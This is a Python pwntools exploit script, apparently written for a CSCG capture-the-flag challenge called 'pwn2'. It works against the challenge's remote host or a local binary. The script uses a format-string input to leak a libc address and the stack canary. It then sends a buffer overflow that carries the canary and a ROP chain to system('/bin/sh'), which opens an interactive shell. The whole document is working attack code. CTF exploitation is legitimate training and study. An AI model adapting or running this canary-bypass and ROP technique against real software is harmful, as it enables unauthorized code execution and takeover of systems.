#!/usr/bin/env python3
from pwn import *
from huepy import *
import sys
import os
import socket
import subprocess
import re

vuln_host = 'hax1.allesctf.net'#'127.0.0.1'
vuln_port = '9101'

app_path = os.getcwd()+'/pwn2'

lo = not 'remote' in sys.argv
dbg = 'dbg' in sys.argv or 'debug' in sys.argv

if dbg:
    log.setLevel(2)

break_main = 'break_main' in sys.argv
buffer_overflow = 'buffer_overflow' in sys.argv

context(os='linux', arch='amd64', bits=64, terminal=['tmux', 'splitw', '-h'])

def init_dbg(app_path):
    args = []
    if break_main and not buffer_overflow:
        args.append('set stop-on-solib-events 1')
        args.append('continue')
        args.append('continue')
        args.append('break __libc_start_main')
        args.append('commands')
        args.append('break *$rdi')
        args.append('continue')
        args.append('end')
        args.append('continue')
        args.append('delete')
    elif buffer_overflow:
        args.append('set context-sections ""')
        args.append('define hook-stop')
        args.append('printf "cyclic: %p\\n", *((int *)$rsp)')
        args.append('python __import__("time").sleep(10000)')
        args.append('end')
        args.append('continue')
    else:
        args.append('continue')
    return gdb.debug(app_path, "\n".join(args))


elf = ELF(app_path)
if lo:
    p = process(app_path) if not dbg else init_dbg(app_path)
    lib = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote(vuln_host,vuln_port)
    lib = "libc.so"
libc = ELF(lib)

def nop_libc():
    rop = ROP(libc)
    rop.raw(rop.search(regs=[], order = 'regs')[0])
    return rop.chain()

def leak_libc_start_main(addr):
    code = libc.disasm(libc.symbols['__libc_start_main'],0x500)
    r = re.findall(r".*call.*rax.*",code)
    if len(r)>0:
        offset = int(r[0].split(":")[0].strip(),16)+len(asm('call rax'))
        log.success("__libc_start_main+%d: "%(offset-libc.symbols['__libc_start_main']) + green(hex(leak)))
        libc.address = leak -offset
        return
    log.error("failed to leak libc, can't calculate base address")
    exit(1)

def shell_system():
    rop = ROP(libc)
    rop.raw(rop.find_gadget(['pop rdi','ret'])[0])
    rop.raw(next(libc.search(b'/bin/sh\x00')))
    rop.call(libc.symbols['system'])
    log.debug("Shell chain: \n" + white(rop.dump()))
    return rop.chain()

#PWN
if lo:
    p.sendlineafter(":\n",r"CSCG{THIS_IS_TEST_FLAG}")
else:
    p.sendlineafter(":\n",r"CSCG{NOW_PRACTICE_MORE}")

if buffer_overflow:
    p.sendlineafter(":",b"A")
    p.sendlineafter(":",b"Expelliarmus\x00"+cyclic(4096)) #we will hit the stack protector, but the padding hasn't changed anyway

p.sendlineafter(":\n",b"AAAA%45$p BBBB%39$p")
p.readuntil("AAAA")
leak = int(p.readuntil(" ").rstrip(),16)
leak_libc_start_main(leak)
log.success("Libc base address: " + green(hex(libc.address)))
p.readuntil("BBBB")
leak = int(p.readuntil(" ").rstrip(),16)
log.success("stack canary: " + green(hex(leak)))
padding = cyclic_find(0x61616e63)
p.sendlineafter(":",b"Expelliarmus\x00"+b"B"*padding+p64(leak)+nop_libc()+nop_libc()+shell_system())

p.interactive()